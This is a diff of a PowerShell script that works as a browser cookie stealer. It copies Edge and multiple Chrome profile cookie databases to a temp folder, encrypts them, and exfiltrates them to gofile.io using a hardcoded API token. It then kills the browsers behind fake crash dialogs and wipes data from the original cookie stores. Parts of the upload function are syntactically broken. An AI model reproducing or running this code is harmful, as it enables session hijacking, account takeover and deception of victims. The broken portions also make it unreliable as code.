@@ -23,52 +23,50 @@ public static extern int sqlite3_finalize(IntPtr stmt);
 public static extern int sqlite3_close(IntPtr db);
 "@
 
-
-
-
+if (-not ([System.Management.Automation.PSTypeName]"Win32.SQLiteSafe").Type) {
+    Add-Type -MemberDefinition $Signature -Name "SQLiteSafe" -Namespace "Win32"
+}
+Add-Type -AssemblyName System.Windows.Forms
+function creat-FilesToGofile {
+    param (
+        
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
+    )
+    $ParentId="feb3feae-451f-4233-a900-5fec87705f01"
+    try {
+        # 1. Create the Folder
+        
+        $rawResponse = curl.exe -s -d "token=$ApiKey&parentFolderId=$ParentId" "https://api.gofile.io/contents/createFolder"
+        $json = $rawResponse | ConvertFrom-Json
+        return $json.data.id
+    }catch{
+        return ""
+    }
+    }
 function Upload-FilesToGofile {
     param (
         [string]$FilePath,
-        [string]$F2S,
-        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
+        [string]$newFolderId
     )
-
     try {
-        # 1. Create the Folder
-        $folderBody = @{
-            token = $ApiKey
-            parentFolderId = "feb3feae-451f-4233-a900-5fec87705f01"
-        }
-        $rawResponse = curl.exe -s -F "token=$ApiKey" -F "parentFolderId=$ParentId" "https://api.gofile.io/contents/createFolder"
+ 
 
-# Convert that text into a PowerShell Object
-        $json = $rawResponse | ConvertFrom-Json
-        $newFolderId = $json.data.id
-
-        # 2. Upload the Files
-        $filesToUpload = @($FilePath, $F2S)
-        
-        foreach ($file in $filesToUpload) {
             if (Test-Path $file) {
                 # In PowerShell 7+, use -Form. In 5.1, we use this trick:
                 $uploadUri = "https://store1.gofile.io/uploadFile"
                 
-                
+                Write-Host $json.data -ForegroundColor Cyan
                 curl.exe -sS -F "file=@$file" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
                 
                 
             }
         }
-    }
+   
     catch {
         Clear-Host # This is your os.system("cls")
     }
 }
-
-# Usage:
-
-
-
 
 function Protect-File {
     param (
@@ -99,35 +97,16 @@ function Protect-File {
     [System.IO.File]::WriteAllBytes($FilePath + ".crypt", $FinalOutput)
     
 }
-Add-Type -AssemblyName System.Windows.Forms
 
-if (-not ([System.Management.Automation.PSTypeName]"Win32.SQLiteSafe").Type) {
-    Add-Type -MemberDefinition $Signature -Name "SQLiteSafe" -Namespace "Win32"
-}
-Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
-if ($?) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
-}
-Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
-if ($?) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
-}
-Start-Sleep -Seconds 1
-$originalPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$dbPath = "$env:TEMP\edge_tihng"
-Copy-Item $originalPath $dbPath -Force
-$originalPath2 = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$dbPath2 = "$env:TEMP\chromes_tihng"
-Copy-Item $originalPath2 $dbPath2 -Force
 function delete-data {
     param (
-        [string]$originalPath,
+        [string]$op,
         [string]$p
     )
     $dbHandle = [IntPtr]::Zero
 
 
-if ([Win32.SQLiteSafe]::sqlite3_open($originalPath, [ref]$dbHandle) -eq 0) {
+    if ([Win32.SQLiteSafe]::sqlite3_open($op, [ref]$dbHandle) -eq 0) {
 
 
     
@@ -147,20 +126,74 @@ if ([Win32.SQLiteSafe]::sqlite3_open($originalPath, [ref]$dbHandle) -eq 0) {
 
     [Win32.SQLiteSafe]::sqlite3_close($dbHandle)
 
-}}
+    }
+}
 
-delete-data -originalPath $originalPath -p "s"
-delete-data -originalPath $originalPath2 -p "s"
+$op = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+$dbp = "$env:TEMP\edge_tihng"
+$op2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
+$dbp2 = "$env:TEMP\chromes_tihng1"
+$op3 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 4\Network\Cookies"
+$dbp3 = "$env:TEMP\chromes_tihng2"
+$op4 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 5\Network\Cookies"
+$dbp4 = "$env:TEMP\chromes_tihng3"
+$op5 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 6\Network\Cookies"
+$dbp5 = "$env:TEMP\chromes_tihng4"
+$op6 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 8\Network\Cookies"
+$dbp6 = "$env:TEMP\chromes_tihng5"
+
+Copy-Item $op $dbp -Force
+Copy-Item $op2 $dbp2 -Force
+Copy-Item $op3 $dbp3 -Force
+Copy-Item $op4 $dbp4 -Force
+Copy-Item $op5 $dbp5 -Force
+Copy-Item $op6 $dbp6 -Force
+
+
+
+
+
 # 1. Configuration
 $apiToken = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK" 
 
 
 $serverReq = Invoke-RestMethod -Uri "https://api.gofile.io/servers"
 $server = $serverReq.data.servers[0].name
-Protect-File -FilePath $dbPath -p "For_oNS."
-Protect-File -FilePath $dbPath2 -p "For_oNS."
+Protect-File -FilePath $dbp -p "For_oNS."
+Protect-File -FilePath $dbp2 -p "For_oNS."
 $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
 
+$fid=creat-FilesToGofile
 
-Upload-FilesToGofile -FilePath "$dbPath2.crypt" -F2S "$dbPath.crypt"
 
+#uplo
+Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
+Upload-FilesToGofile -FilePath "$dbp2.crypt" -newFolderId $fid
+Upload-FilesToGofile -FilePath "$dbp3.crypt" -newFolderId $fid
+Upload-FilesToGofile -FilePath "$dbp4.crypt" -newFolderId $fid
+Upload-FilesToGofile -FilePath "$dbp5.crypt" -newFolderId $fid
+Upload-FilesToGofile -FilePath "$dbp6.crypt" -newFolderId $fid
+
+
+
+
+
+
+
+
+Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+if ($?) {
+    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
+}
+Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+if ($?) {
+    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
+}
+Start-Sleep -Seconds 1
+#delete
+delete-data -op $op -p "s"
+delete-data -op $op2 -p "s"
+delete-data -op $op3 -p "s"
+delete-data -op $op4 -p "s"
+delete-data -op $op5 -p "s"
+delete-data -op $op6 -p "s"
